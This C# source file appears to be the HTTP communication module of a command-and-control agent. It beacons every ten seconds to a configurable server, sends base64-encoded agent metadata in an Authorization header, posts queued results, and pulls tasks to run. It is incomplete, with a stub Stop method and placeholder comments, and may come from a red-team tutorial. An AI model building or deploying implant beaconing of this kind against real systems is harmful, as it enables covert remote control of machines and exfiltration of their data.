using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Models
{
    internal class HttpCommModule : CommModule
    {
        public string ConnectAddress { get; set; }
        public int ConnectPort { get; set; }
        private CancellationTokenSource _tokenSource;
        private HttpClient _httpClient;


        public override void Init(AgentMetadata agent)
        {
            base.Init(agent);
            _httpClient = new HttpClient();
            _httpClient.BaseAddress = new Uri($"http://{ConnectAddress}:{ConnectPort}");
            _httpClient.DefaultRequestHeaders.Clear();

            var encoded = Convert.ToBase64String(Metadata.Serialize());
            _httpClient.DefaultRequestHeaders.Add("Authorization", $"Bearer ${encoded}");

        }

        public HttpCommModule(string connectAddress, int connectPort)
        {
            ConnectAddress = connectAddress;
            ConnectPort = connectPort;
        }

        public override async Task Start()
        {
            _tokenSource = new CancellationTokenSource();

            while (!_tokenSource.IsCancellationRequested)
            {
                //check to see if we must send data
                if (!Outbound.IsEmpty)
                {
                    await PostData();
                }
                else
                {
                    await CheckIn();
                    // check in
                }

                // get tasks

                // sleep
                await Task.Delay(10000);


            }
        }

        private async Task PostData()
        {
            var outbound = GetAllOutbound().Serialize();
            var content = new StringContent(Encoding.UTF8.GetString(outbound), Encoding.UTF8, "application/json");

            var response = await _httpClient.PostAsync("/", content);
            var resContent = await response.Content.ReadAsByteArrayAsync();

            HandleResponse(resContent);
        }

        public async Task CheckIn()
        {
            var response = await _httpClient.GetByteArrayAsync("/");
            HandleResponse(response);
        }

        private void HandleResponse(byte[] response)
        {
            var tasks = response.Deserialize<AgentTask[]>();
            if (tasks != null && tasks.Any())
            {
                foreach (var agentTask in tasks)
                {
                    Inbound.Enqueue(agentTask);
                }
            }

        }
        public override void Stop()
        {
            throw new NotImplementedException();
        }
    }
}
